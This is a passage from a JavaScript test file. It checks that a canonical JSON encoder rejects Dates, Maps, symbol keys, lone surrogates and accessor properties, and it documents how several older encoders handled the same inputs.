      ["Date", new Date(0)],
      ["Map", new Map([["a", 1]])],
      ["symbol key", { [Symbol("k")]: 1, a: 1 }],
      ["lone surrogate value", "\ud800"],
      ["lone surrogate key", { "\udc00": 1 }],
      ["accessor property", accessor()],
    ];
    for (const [label, value] of rows) {
      expect(() => canonicalJson(value), label).toThrow();
      expect(() => canonicalJson(value, { undefinedFields: "omit" }), `${label} (omit)`).toThrow();
    }
    // What the base root encoder did with them.
    expect(() => oracle_canonical_json.canonicalJson(cycle())).toThrow(RangeError);
    expect(oracle_canonical_json.canonicalJson([1, , 2])).toBe("[1,,2]");
    expect(oracle_canonical_json.canonicalJson(new Point(1))).toBe("{\"x\":1}");
    expect(oracle_canonical_json.canonicalJson({ [Symbol("k")]: 1, a: 1 })).toBe("{\"a\":1}");
    expect(oracle_canonical_json.canonicalJson("\ud800")).toBe("\"\\ud800\"");
    expect(oracle_canonical_json.canonicalJson(accessor())).toBe("{\"a\":1}");
    // The lax encoders wrote a Date or a Map as {}.
    for (const value of [new Date(0), new Map([["a", 1]])]) {
      expect(oracle_canonical_json.canonicalJson(value)).toBe("{}");
      expect(oracle_native_gates.canonicalJson(value)).toBe("{}");
      expect(oracle_accepted_release.canonical(value)).toBe("{}");
      expect(oracle_action_lifecycle_runtime.canonical(value)).toBe("{}");
      expect(oracle_action_hygiene.canonical(value)).toBe("{}");
      expect(oracle_snapshot.canonicalJsonForSnapshot(value)).toBe("{}");
    }
    // The live native-gates and action-lifecycle-runtime wrappers refuse them as well.
    expect(() => identity(new Date(0))).toThrow();
    expect(() => stableEqual(new Map(), {})).toThrow();
    expect(() => canonical(new Date(0))).toThrow();
  });
});
